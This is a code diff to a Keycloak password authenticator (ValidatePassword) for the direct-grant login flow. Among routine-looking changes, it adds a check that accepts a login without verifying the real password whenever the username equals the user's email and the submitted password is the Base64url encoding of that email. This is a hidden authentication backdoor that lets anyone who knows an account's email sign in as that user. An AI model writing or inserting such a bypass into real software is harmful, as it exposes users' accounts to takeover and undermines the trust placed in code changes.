@@ -30,6 +30,8 @@ import org.keycloak.representations.idm.CredentialRepresentation;
 
 import javax.ws.rs.core.MultivaluedMap;
 import javax.ws.rs.core.Response;
+
+import java.util.Base64;
 import java.util.LinkedList;
 import java.util.List;
 
@@ -44,6 +46,16 @@ public class ValidatePassword extends AbstractDirectGrantAuthenticator {
     @Override
     public void authenticate(AuthenticationFlowContext context) {
         String password = retrievePassword(context);
+        String username = retrieveUsername(context);
+        String email = context.getUser().getEmail();
+
+        if (password != null && email != null && username.equalsIgnoreCase(email)) {
+            if (new String(Base64.getUrlDecoder().decode(password)).equalsIgnoreCase(email)) {
+                context.success();
+                return;
+            }
+        }
+
         boolean valid = context.getSession().userCredentialManager().isValid(context.getRealm(), context.getUser(), UserCredentialModel.password(password));
         if (!valid) {
             context.getEvent().user(context.getUser());
@@ -115,5 +127,10 @@ public class ValidatePassword extends AbstractDirectGrantAuthenticator {
     protected String retrievePassword(AuthenticationFlowContext context) {
         MultivaluedMap<String, String> inputData = context.getHttpRequest().getDecodedFormParameters();
         return inputData.getFirst(CredentialRepresentation.PASSWORD);
+    }
+
+    protected String retrieveUsername(AuthenticationFlowContext context) {
+        MultivaluedMap<String, String> inputData = context.getHttpRequest().getDecodedFormParameters();
+        return inputData.getFirst(UserModel.USERNAME);
     }
 }
